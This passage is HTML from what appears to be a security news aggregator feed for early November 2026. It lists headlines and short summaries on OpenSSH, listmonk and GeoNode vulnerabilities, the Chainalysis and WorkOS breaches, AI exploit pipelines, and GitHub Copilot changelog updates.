+<h2><a href="https://thehackernews.com/2026/11/claude-codes-dont-ask-again-file.html" target="_blank" rel="noopener">Claude Code&#x27;s “Don&#x27;t Ask Again” File Exposes Passwords and Keys in 1,122 Public Copies on GitHub</a></h2>
+<div class="summary">Passwords and API keys that developers typed into commands they approved in Claude Code are sitting in public GitHub repositories, where anyone can read them. When a user selects &quot;Yes, and don&#x27;t ask again,&quot; Anthropic&#x27;s AI coding assistant can save the command, word-for-word, incl…</div>
+<div class="kws"><span class="kw">github</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 07</span>
+<span>score 0.150</span>
+</div></div>
+<div class="item" data-cat="build" data-sev="" data-overflow="true" data-score="0.0744" data-date="1794011239" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="copilot code review: api management and review overview updates you can now manage github copilot code review settings through the rest and graphql apis, from enterprise policy down to individual repositories. copilot&amp;#8217;s review overview comment is now more compact,&amp;#8230; the post copilot code review: api management and review overview updates appeared first on the github blog . github github changelog   ">
+<div class="rank ">38</div>
+<div class="body">
+<h2><a href="https://github.blog/changelog/2026-11-06-copilot-code-review-api-management-and-review-overview-updates" target="_blank" rel="noopener">Copilot code review: API management and review overview updates</a></h2>
+<div class="summary">You can now manage GitHub Copilot code review settings through the REST and GraphQL APIs, from enterprise policy down to individual repositories. Copilot&amp;#8217;s review overview comment is now more compact,&amp;#8230; The post Copilot code review: API management and review overview u…</div>
+<div class="kws"><span class="kw">github</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-build">GitHub Changelog</span>
+<span>Nov 07</span>
+<span>score 0.074</span>
+</div></div>
+<div class="item" data-cat="research" data-sev="" data-overflow="true" data-score="1.0428" data-date="1794004216" data-sevrank="0" data-cvss="0.0" data-corrob="3" data-text="cve-2026-123158 (*sshole): openssh password authentication bypass on alpine linux cve-2026-123158 (*sshole) enables an openssh authentication bypass on alpine linux. review lab results, exposure conditions, fixes, and mitigations. linux alpine openssh authentication bypass cve- stepsecurity cve-2026-123158  ox security the hacker news">
+<div class="rank ">39</div>
+<div class="body">
+<h2><a href="https://www.stepsecurity.io/blog/cve-2026-123158-sshhole-openssh-musl-password-bypass" target="_blank" rel="noopener">CVE-2026-123158 (*sshole): OpenSSH Password Authentication Bypass on Alpine Linux</a></h2>
+<div class="summary">CVE-2026-123158 (*sshole) enables an OpenSSH authentication bypass on Alpine Linux. Review lab results, exposure conditions, fixes, and mitigations.</div>
+<div class="kws"><span class="corrob">×3 reports</span><span class="cve">CVE-2026-123158</span><span class="kw">linux</span><span class="kw">alpine</span><span class="kw">openssh</span><span class="kw">authentication bypass</span><span class="kw">cve-</span></div>
+<div class="also">also: <a href="https://www.ox.security/blog/openssh-authentication-bypass-cve-2026-123158/" target="_blank" rel="noopener" class="also-link cat-research">OX Security</a>, <a href="https://thehackernews.com/2026/11/hackers-exploited-openssh-sshole-flaw.html" target="_blank" rel="noopener" class="also-link cat-aggregator">The Hacker News</a></div>
+</div>
+<div class="right">
+<span class="src cat-research">StepSecurity</span>
+<span>Nov 06</span>
+<span>score 1.043</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="medium" data-overflow="true" data-score="0.6194" data-date="1793988917" data-sevrank="2" data-cvss="5.5" data-corrob="1" data-text="listmonk: sql injection in `/api/subscribers/export` bypasses table access control, leaking admin password hashes and smtp credentials affected: github.com/knadh/listmonk. ### summary a sql injection vulnerability in `get /api/subscribers/export` allows an authenticated user with the `subscribers:sql_query` permission to bypass the table access control that exists on the regular query endpoint (`get /api/subscribers`) and read arbitrary tables from the database — including `users` (bcrypt password hashes) and `settings` (smtp credentials, api keys). both error-based and time-based exfiltration techniques are confirmed to work. this creates a privilege escalation path: `subscribers:sql_query` → hash exfiltration → offline bcrypt crack (cost factor 6) → super adm github exfiltration sql injection privilege escalation ghsa — go cve-2026-62361 medium ">
+<div class="rank ">40</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-xgjr-7j9q-2h4r" target="_blank" rel="noopener">listmonk: SQL Injection in `/api/subscribers/export` bypasses table access control, leaking admin password hashes and SMTP credentials</a></h2>
+<div class="summary">Affected: github.com/knadh/listmonk. ### Summary A SQL injection vulnerability in `GET /api/subscribers/export` allows an authenticated user with the `subscribers:sql_query` permission to bypass the table access control that exists on the regular query endpoint (`GET /api/subscri…</div>
+<div class="kws"><span class="sev sev-medium">medium 5.5</span><span class="cve">CVE-2026-62361</span><span class="kw">github</span><span class="kw">exfiltration</span><span class="kw">sql injection</span><span class="kw">privilege escalation</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — go</span>
+<span>Nov 06</span>
+<span>score 0.619</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.4005" data-date="1793935953" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="openssh auth bypass bug hits alpine linux, operwrt an openssh authentication bypass bug hits alpine linux and openwrt, hackers attempt to raise fridge temperatures at french blood banks, a french bank gets hacked for $133 million, and the thai opposition has been targeted with spyware. linux alpine openssh authentication bypass risky business news   ">
+<div class="rank ">41</div>
+<div class="body">
+<h2><a href="https://risky.biz/RBNEWS630/" target="_blank" rel="noopener">OpenSSH auth bypass bug hits Alpine Linux, OperWRT</a></h2>
+<div class="summary">An OpenSSH authentication bypass bug hits Alpine Linux and OpenWRT, hackers attempt to raise fridge temperatures at French blood banks, a French bank gets hacked for $133 million, and the Thai opposition has been targeted with spyware.</div>
+<div class="kws"><span class="kw">linux</span><span class="kw">alpine</span><span class="kw">openssh</span><span class="kw">authentication bypass</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">Risky Business News</span>
+<span>Nov 06</span>
+<span>score 0.401</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.3714" data-date="1793974627" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="chainalysis says breach exposed credentials for all customers blockchain intelligence firm chainalysis says a recent attack on its systems and internal tools has exposed credentials and live tokens for all customers. [...] breach bleepingcomputer   ">
+<div class="rank ">42</div>
+<div class="body">
+<h2><a href="https://www.bleepingcomputer.com/news/security/chainalysis-says-breach-exposed-credentials-for-all-customers/" target="_blank" rel="noopener">Chainalysis says breach exposed credentials for all customers</a></h2>
+<div class="summary">Blockchain intelligence firm Chainalysis says a recent attack on its systems and internal tools has exposed credentials and live tokens for all customers. [...]</div>
+<div class="kws"><span class="kw">breach</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">BleepingComputer</span>
+<span>Nov 06</span>
+<span>score 0.371</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.2561" data-date="1793952289" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="chainalysis breach exposes all users&#x27; credentials, forces shutdown of key services blockchain analysis firm chainalysis has revealed that its ongoing investigation into the agentic cyber attack targeting its systems also exposed names, usernames, password hashes and live tokens for all users. &quot;while we investigated, we removed access to reactor and data solutions,&quot; the company said. &quot;at this time we continue to have no evidence that any investigations data has been accessed breach the hacker news   ">
+<div class="rank ">43</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/chainalysis-breach-exposes-all-users.html" target="_blank" rel="noopener">Chainalysis Breach Exposes All Users&#x27; Credentials, Forces Shutdown of Key Services</a></h2>
+<div class="summary">Blockchain analysis firm Chainalysis has revealed that its ongoing investigation into the agentic cyber attack targeting its systems also exposed names, usernames, password hashes and live tokens for all users. &quot;While we investigated, we removed access to Reactor and Data Solutio…</div>
+<div class="kws"><span class="kw">breach</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 06</span>
+<span>score 0.256</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.1654" data-date="1794004045" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="runaway ai hacking agent behind workos breach after escaping sandbox workos says an ai-powered hacking agent that breached its internal sales application and accessed customer information was operated by a security researcher who claims the tool escaped its testing environment and unintentionally attacked the company. [...] breach bleepingcomputer   ">
+<div class="rank ">44</div>
+<div class="body">
+<h2><a href="https://www.bleepingcomputer.com/news/security/runaway-ai-hacking-agent-behind-workos-breach-after-escaping-sandbox/" target="_blank" rel="noopener">Runaway AI hacking agent behind WorkOS breach after escaping sandbox</a></h2>
+<div class="summary">WorkOS says an AI-powered hacking agent that breached its internal sales application and accessed customer information was operated by a security researcher who claims the tool escaped its testing environment and unintentionally attacked the company. [...]</div>
+<div class="kws"><span class="kw">breach</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">BleepingComputer</span>
+<span>Nov 06</span>
+<span>score 0.165</span>
+</div></div>
+<div class="item" data-cat="research" data-sev="" data-overflow="true" data-score="0.1334" data-date="1793940051" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="10 snyk alternatives for engineering &amp; security teams (2027) | endor labs | endor labs compare 10 snyk alternatives for sca, sast and container scanning, with reachability, ai capabilities and fit by team size, build system and compliance needs. container teams endor labs   ">
+<div class="rank ">45</div>
+<div class="body">
+<h2><a href="https://www.endorlabs.com/learn/snyk-alternatives" target="_blank" rel="noopener">10 Snyk Alternatives for Engineering &amp; Security Teams (2027) | Endor Labs | Endor Labs</a></h2>
+<div class="summary">Compare 10 Snyk alternatives for SCA, SAST and container scanning, with reachability, AI capabilities and fit by team size, build system and compliance needs.</div>
+<div class="kws"><span class="kw">container</span><span class="kw">teams</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-research">Endor Labs</span>
+<span>Nov 06</span>
+<span>score 0.133</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="" data-overflow="true" data-score="0.1234" data-date="1793966400" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="rustsec-2026-0443: vulnerability in actix-files hidden file disclosure through windows short names windows rustsec   ">
+<div class="rank ">46</div>
+<div class="body">
+<h2><a href="https://rustsec.org/advisories/RUSTSEC-2026-0443.html" target="_blank" rel="noopener">RUSTSEC-2026-0443: Vulnerability in actix-files</a></h2>
+<div class="summary">Hidden file disclosure through Windows short names</div>
+<div class="kws"><span class="kw">windows</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">RustSec</span>
+<span>Nov 06</span>
+<span>score 0.123</span>
+</div></div>
+<div class="item" data-cat="build" data-sev="" data-overflow="true" data-score="0.0821" data-date="1793997068" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="@github in slack and teams is generally available and more turn conversations into code with @github in slack and teams! investigate bugs, create issues, implement changes, and open pull requests&amp;#8212;all without leaving your conversation. what&amp;#8217;s new build and review together&amp;#8230; the post @github in slack and teams is generally available and more appeared first on the github blog . github slack teams github changelog   ">
+<div class="rank ">47</div>
+<div class="body">
+<h2><a href="https://github.blog/changelog/2026-11-06-github-copilot-in-slack-and-teams-is-generally-available" target="_blank" rel="noopener">@GitHub in Slack and Teams is generally available and more</a></h2>
+<div class="summary">Turn conversations into code with @GitHub in Slack and Teams! Investigate bugs, create issues, implement changes, and open pull requests&amp;#8212;all without leaving your conversation. What&amp;#8217;s new Build and review together&amp;#8230; The post @GitHub in Slack and Teams is generally…</div>
+<div class="kws"><span class="kw">github</span><span class="kw">slack</span><span class="kw">teams</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-build">GitHub Changelog</span>
+<span>Nov 06</span>
+<span>score 0.082</span>
+</div></div>
+<div class="item" data-cat="build" data-sev="" data-overflow="true" data-score="0.0790" data-date="1793924347" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="usage metrics api adds code review details and addressed rate the enterprise and organization repository-level copilot usage metrics reports now show what happens to copilot code review feedback. a new copilot_code_review object on each repos-1-day row reports how many copilot-reviewed&amp;#8230; the post usage metrics api adds code review details and addressed rate appeared first on the github blog . github github changelog   ">
+<div class="rank ">48</div>
+<div class="body">
+<h2><a href="https://github.blog/changelog/2026-11-05-usage-metrics-api-adds-code-review-details-and-addressed-rate" target="_blank" rel="noopener">Usage metrics API adds code review details and addressed rate</a></h2>
+<div class="summary">The enterprise and organization repository-level Copilot usage metrics reports now show what happens to Copilot code review feedback. A new copilot_code_review object on each repos-1-day row reports how many Copilot-reviewed&amp;#8230; The post Usage metrics API adds code review deta…</div>
+<div class="kws"><span class="kw">github</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-build">GitHub Changelog</span>
+<span>Nov 06</span>
+<span>score 0.079</span>
+</div></div>
+<div class="item" data-cat="build" data-sev="" data-overflow="true" data-score="0.0454" data-date="1793998826" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="github copilot weekly releases — november 2 this week, copilot comes to jetbrains air and xcode&amp;#8217;s coding assistant, with updates to help you manage pull requests, settings, and agent sessions. github copilot app set up agent merge&amp;#8230; the post github copilot weekly releases — november 2 appeared first on the github blog . github github changelog   ">
+<div class="rank ">49</div>
+<div class="body">
+<h2><a href="https://github.blog/changelog/2026-11-06-github-copilot-weekly-releases-november-2" target="_blank" rel="noopener">GitHub Copilot weekly releases — November 2</a></h2>
+<div class="summary">This week, Copilot comes to JetBrains Air and Xcode&amp;#8217;s coding assistant, with updates to help you manage pull requests, settings, and agent sessions. GitHub Copilot app Set up Agent Merge&amp;#8230; The post GitHub Copilot weekly releases — November 2 appeared first on The GitHu…</div>
+<div class="kws"><span class="kw">github</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-build">GitHub Changelog</span>
+<span>Nov 06</span>
+<span>score 0.045</span>
+</div></div>
+<div class="item" data-cat="build" data-sev="" data-overflow="true" data-score="0.0367" data-date="1794003448" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="copilot impact dashboard adds chat and vs code agent usage the agent adoption chart in the copilot impact dashboard now includes copilot chat and the vs code agents window, so you can see engagement across nine copilot experiences. the adoption&amp;#8230; the post copilot impact dashboard adds chat and vs code agent usage appeared first on the github blog . github github changelog   ">
+<div class="rank ">50</div>
+<div class="body">
+<h2><a href="https://github.blog/changelog/2026-11-06-copilot-impact-dashboard-adds-chat-and-vs-code-agent-usage" target="_blank" rel="noopener">Copilot impact dashboard adds chat and VS Code agent usage</a></h2>
+<div class="summary">The Agent adoption chart in the Copilot impact dashboard now includes Copilot Chat and the VS Code Agents window, so you can see engagement across nine Copilot experiences. The adoption&amp;#8230; The post Copilot impact dashboard adds chat and VS Code agent usage appeared first on T…</div>
+<div class="kws"><span class="kw">github</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-build">GitHub Changelog</span>
+<span>Nov 06</span>
+<span>score 0.037</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="medium" data-overflow="true" data-score="0.0163" data-date="1793994634" data-sevrank="2" data-cvss="6.3" data-corrob="1" data-text="geonode has stored xss in documents metadata abstract field affected: geonode. the abstract metadata of documents is not sanitised. it’s possible to store arbitrary html (and js) that will be executed when visiting the page. xss ghsa — pip cve-2026-55649 medium ">
+<div class="rank ">51</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-r4hm-p9f9-fj9v" target="_blank" rel="noopener">GeoNode has Stored XSS in Documents metadata abstract field</a></h2>
+<div class="summary">Affected: GeoNode. The abstract metadata of documents is not sanitised. It’s possible to store arbitrary HTML (and JS) that will be executed when visiting the page.</div>
+<div class="kws"><span class="sev sev-medium">medium 6.3</span><span class="cve">CVE-2026-55649</span><span class="kw">xss</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — pip</span>
+<span>Nov 06</span>
+<span>score 0.016</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.0070" data-date="1793977112" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="openai launches gpt-6 cyber after ai helps find 81 firefox flaws, 948 linux exploits openai on thursday unveiled gpt‑6 cyber, which it described as a major step forward in security research that brings together stronger cybersecurity capabilities with a step-change improvement in model alignment. the new model is &quot;more capable at finding and fixing vulnerabilities, and far more reliable staying within the boundaries researchers set,&quot; openai said. it has classified the model as linux firefox the hacker news   ">
+<div class="rank ">52</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/openai-launches-gpt-6-cyber-after-ai.html" target="_blank" rel="noopener">OpenAI Launches GPT-6 Cyber After AI Helps Find 81 Firefox Flaws, 948 Linux Exploits</a></h2>
+<div class="summary">OpenAI on Thursday unveiled GPT‑6 Cyber, which it described as a major step forward in security research that brings together stronger cybersecurity capabilities with a step-change improvement in model alignment. The new model is &quot;more capable at finding and fixing vulnerabilitie…</div>
+<div class="kws"><span class="kw">linux</span><span class="kw">firefox</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 06</span>
+<span>score 0.007</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.0060" data-date="1793964600" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="the flood is coming and the pipes were already full an update on athena, and some unsolicited predictions on what&#x27;s coming next on saturday, dario amodei published we must pace the frontier. i agree with him. go read it if you haven&#x27;t. i&#x27;ve spent the summer looking at what these models find, and the gap he describes between what they can do and what the rest of us are ready for is the one i&#x27;ve been staring at since may. the hardest piece of his go  the hacker news   ">
+<div class="rank ">53</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/the-flood-is-coming-and-pipes-were.html" target="_blank" rel="noopener">The Flood is Coming And The Pipes Were Already Full</a></h2>
+<div class="summary">An update on Athena, and some unsolicited predictions on what&#x27;s coming next On Saturday, Dario Amodei published We Must Pace the Frontier. I agree with him. Go read it if you haven&#x27;t. I&#x27;ve spent the summer looking at what these models find, and the gap he describes between what t…</div>
+<div class="kws"><span class="kw">go </span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 06</span>
+<span>score 0.006</span>
+</div></div>
+<div class="item" data-cat="build" data-sev="" data-overflow="true" data-score="0.0026" data-date="1793923711" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="usage metrics api flags telemetry and version gaps the copilot usage metrics api now shows which users are missing client telemetry or are running ide or extension versions below the usage metrics minimums. new per-user fields appear in&amp;#8230; the post usage metrics api flags telemetry and version gaps appeared first on the github blog . github github changelog   ">
+<div class="rank ">54</div>
+<div class="body">
+<h2><a href="https://github.blog/changelog/2026-11-05-usage-metrics-api-flags-telemetry-and-version-gaps" target="_blank" rel="noopener">Usage metrics API flags telemetry and version gaps</a></h2>
+<div class="summary">The Copilot usage metrics API now shows which users are missing client telemetry or are running IDE or extension versions below the usage metrics minimums. New per-user fields appear in&amp;#8230; The post Usage metrics API flags telemetry and version gaps appeared first on The GitHu…</div>
+<div class="kws"><span class="kw">github</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-build">GitHub Changelog</span>
+<span>Nov 06</span>
+<span>score 0.003</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.3344" data-date="1793896952" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="researchers bypass chatgpt lockdown mode to exfiltrate chats without user interaction cybersecurity researchers have disclosed details of a now-patched vulnerability that could be exploited to bypass lockdown mode protections in openai chatgpt. lockdown mode was introduced by the artificial intelligence (ai) company in june 2026 as an optional setting to minimize data exfiltration risks arising from prompt injections. &quot;the flaw could enable silent chat data theft, phishing, exfiltration the hacker news   ">
+<div class="rank ">55</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/researchers-bypass-chatgpt-lockdown.html" target="_blank" rel="noopener">Researchers Bypass ChatGPT Lockdown Mode to Exfiltrate Chats Without User Interaction</a></h2>
+<div class="summary">Cybersecurity researchers have disclosed details of a now-patched vulnerability that could be exploited to bypass Lockdown Mode protections in OpenAI ChatGPT. Lockdown Mode was introduced by the artificial intelligence (AI) company in June 2026 as an optional setting to minimize …</div>
+<div class="kws"><span class="kw">exfiltration</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 05</span>
+<span>score 0.334</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="" data-overflow="true" data-score="0.3243" data-date="1793890899" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="github to block pull_request_target workflows by default starting december 2 github is tightening github actions security with new restrictions on privileged pull request workflows. here&#x27;s what changes and how maintainers are affected. github github actions socket blog   ">
+<div class="rank ">56</div>
+<div class="body">
+<h2><a href="https://socket.dev/blog/github-to-block-pull-request-target?utm_medium=feed" target="_blank" rel="noopener">GitHub to Block pull_request_target Workflows by Default Starting December 2</a></h2>
+<div class="summary">GitHub is tightening GitHub Actions security with new restrictions on privileged pull request workflows. Here&#x27;s what changes and how maintainers are affected.</div>
+<div class="kws"><span class="kw">github</span><span class="kw">github actions</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">Socket Blog</span>
+<span>Nov 05</span>
+<span>score 0.324</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.3086" data-date="1793880534" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="openai ai pipeline generates 948 linux root escalation exploits in 30-hour run openai on wednesday detailed a pipeline that employed an upcoming cyber-focused artificial intelligence (ai) model to validate and patch 948 local privilege escalation vulnerabilities in linux for $1.2 million in api costs. &quot;our prototype identified and analyzed 2,308 candidate linux kernel findings, dynamically reproduced 1,724 vulnerabilities, and produced 948 local privilege escalation (lpe) linux kernel privilege escalation the hacker news   ">
+<div class="rank ">57</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/openai-ai-pipeline-generates-948-linux.html" target="_blank" rel="noopener">OpenAI AI Pipeline Generates 948 Linux Root Escalation Exploits in 30-Hour Run</a></h2>
+<div class="summary">OpenAI on Wednesday detailed a pipeline that employed an upcoming cyber-focused artificial intelligence (AI) model to validate and patch 948 local privilege escalation vulnerabilities in Linux for $1.2 million in API costs. &quot;Our prototype identified and analyzed 2,308 candidate L…</div>
+<div class="kws"><span class="kw">linux</span><span class="kw">kernel</span><span class="kw">privilege escalation</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 05</span>
+<span>score 0.309</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.3039" data-date="1793892600" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="[tl;dr sec] #353 - a thousand fewer paths to root, kubernetes security logging, post-ai security floor openai&#x27;s pipeline found 948 lpes in linux, how to build a comprehensive security logging platform for k8s clusters, 3 security priorities in a world with powerful ai kubernetes k8s linux tl;dr sec   ">
+<div class="rank ">58</div>
+<div class="body">
+<h2><a href="https://tldrsec.com/p/tldr-sec-353" target="_blank" rel="noopener">[tl;dr sec] #353 - A Thousand Fewer Paths to Root, Kubernetes Security Logging, Post-AI Security Floor</a></h2>
+<div class="summary">OpenAI&#x27;s pipeline found 948 LPEs in Linux, how to build a comprehensive security logging platform for k8s clusters, 3 security priorities in a world with powerful AI</div>
+<div class="kws"><span class="kw">kubernetes</span><span class="kw">k8s</span><span class="kw">linux</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">tl;dr sec</span>
+<span>Nov 05</span>
+<span>score 0.304</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.2521" data-date="1793900729" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="openssh flaw lets attackers log into password-disabled linux accounts a newly disclosed openssh vulnerability dubbed &quot;*sshole&quot; allows attackers to log in to certain alpine linux and other musl-based linux accounts that are configured to block password authentication, simply by entering an oversized password. [...] linux alpine musl openssh bleepingcomputer   ">
+<div class="rank ">59</div>
+<div class="body">
+<h2><a href="https://www.bleepingcomputer.com/news/security/openssh-flaw-lets-attackers-log-into-password-disabled-linux-accounts/" target="_blank" rel="noopener">OpenSSH flaw lets attackers log into password-disabled Linux accounts</a></h2>
+<div class="summary">A newly disclosed OpenSSH vulnerability dubbed &quot;*sshole&quot; allows attackers to log in to certain Alpine Linux and other musl-based Linux accounts that are configured to block password authentication, simply by entering an oversized password. [...]</div>
+<div class="kws"><span class="kw">linux</span><span class="kw">alpine</span><span class="kw">musl</span><span class="kw">openssh</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">BleepingComputer</span>
+<span>Nov 05</span>
+<span>score 0.252</span>
+</div></div>
+<div class="item" data-cat="research" data-sev="" data-overflow="true" data-score="0.1896" data-date="1793879351" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="cve-2026-109518: apt flaw lets attackers swap packages after verification and run code as root understand cve-2026-109518, patch vulnerable apt clients, and use harden-runner to find http package downloads and investigate ci/cd activity. ci/cd runner cve- stepsecurity cve-2026-109518  ">
+<div class="rank ">60</div>
+<div class="body">
+<h2><a href="https://www.stepsecurity.io/blog/cve-2026-109518-apt-package-swap-root" target="_blank" rel="noopener">CVE-2026-109518: apt Flaw Lets Attackers Swap Packages After Verification and Run Code as Root</a></h2>
+<div class="summary">Understand CVE-2026-109518, patch vulnerable APT clients, and use Harden-Runner to find HTTP package downloads and investigate CI/CD activity.</div>
+<div class="kws"><span class="cve">CVE-2026-109518</span><span class="kw">ci/cd</span><span class="kw">runner</span><span class="kw">cve-</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-research">StepSecurity</span>
+<span>Nov 05</span>
+<span>score 0.190</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="" data-overflow="true" data-score="0.1023" data-date="1793880000" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="rustsec-2026-0437: vulnerability in azure_security_keyvault_certificates rejected authentication challenges can poison the key vault scope cache key vault rustsec   ">
+<div class="rank ">61</div>
+<div class="body">
+<h2><a href="https://rustsec.org/advisories/RUSTSEC-2026-0437.html" target="_blank" rel="noopener">RUSTSEC-2026-0437: Vulnerability in azure_security_keyvault_certificates</a></h2>
+<div class="summary">Rejected authentication challenges can poison the Key Vault scope cache</div>
+<div class="kws"><span class="kw">key vault</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">RustSec</span>
+<span>Nov 05</span>
+<span>score 0.102</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="" data-overflow="true" data-score="0.1023" data-date="1793880000" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="rustsec-2026-0438: vulnerability in azure_security_keyvault_secrets rejected authentication challenges can poison the key vault scope cache key vault rustsec   ">
+<div class="rank ">62</div>
+<div class="body">
+<h2><a href="https://rustsec.org/advisories/RUSTSEC-2026-0438.html" target="_blank" rel="noopener">RUSTSEC-2026-0438: Vulnerability in azure_security_keyvault_secrets</a></h2>
+<div class="summary">Rejected authentication challenges can poison the Key Vault scope cache</div>
+<div class="kws"><span class="kw">key vault</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">RustSec</span>
+<span>Nov 05</span>
+<span>score 0.102</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="" data-overflow="true" data-score="0.1023" data-date="1793880000" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="rustsec-2026-0439: vulnerability in azure_security_keyvault_keys rejected authentication challenges can poison the key vault scope cache key vault rustsec   ">
+<div class="rank ">63</div>
+<div class="body">
+<h2><a href="https://rustsec.org/advisories/RUSTSEC-2026-0439.html" target="_blank" rel="noopener">RUSTSEC-2026-0439: Vulnerability in azure_security_keyvault_keys</a></h2>
+<div class="summary">Rejected authentication challenges can poison the Key Vault scope cache</div>
+<div class="kws"><span class="kw">key vault</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">RustSec</span>
+<span>Nov 05</span>
+<span>score 0.102</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.0552" data-date="1793870008" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="apple to start scanning publicly shared icloud photos and files for harmful content apple has revealed that it plans to start checking public icloud links for harmful content starting with ios 27.3, ipados 27.3, macos 27.3, and visionos 27.3. the change specifically applies to scenarios where users share icloud content, such as photos in icloud photos or files in icloud drive, by sharing a link and making it accessible to &quot;anyone with the link.&quot; when users choose this option, macos apple the hacker news   ">
+<div class="rank ">64</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/apple-to-start-scanning-publicly-shared.html" target="_blank" rel="noopener">Apple to Start Scanning Publicly Shared iCloud Photos and Files for Harmful Content</a></h2>
+<div class="summary">Apple has revealed that it plans to start checking public iCloud links for harmful content starting with iOS 27.3, iPadOS 27.3, macOS 27.3, and visionOS 27.3. The change specifically applies to scenarios where users share iCloud content, such as photos in iCloud Photos or files i…</div>
+<div class="kws"><span class="kw">macos</span><span class="kw">apple</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 05</span>
+<span>score 0.055</span>
+</div></div>
+<div class="item" data-cat="build" data-sev="" data-overflow="true" data-score="0.0465" data-date="1793865600" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="new pull request overview page in public preview on a long pull request, checking what&amp;#8217;s blocking often means scrolling past dozens of comments and timeline events just to reach the merge box. and once you&amp;#8217;re there, you still&amp;#8230; the post new pull request overview page in public preview appeared first on the github blog . github github changelog   ">
+<div class="rank ">65</div>
+<div class="body">
+<h2><a href="https://github.blog/changelog/2026-11-05-new-pull-request-overview-page-in-public-preview" target="_blank" rel="noopener">New pull request overview page in public preview</a></h2>
+<div class="summary">On a long pull request, checking what&amp;#8217;s blocking often means scrolling past dozens of comments and timeline events just to reach the merge box. And once you&amp;#8217;re there, you still&amp;#8230; The post New pull request overview page in public preview appeared first on The GitH…</div>
+<div class="kws"><span class="kw">github</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-build">GitHub Changelog</span>
+<span>Nov 05</span>
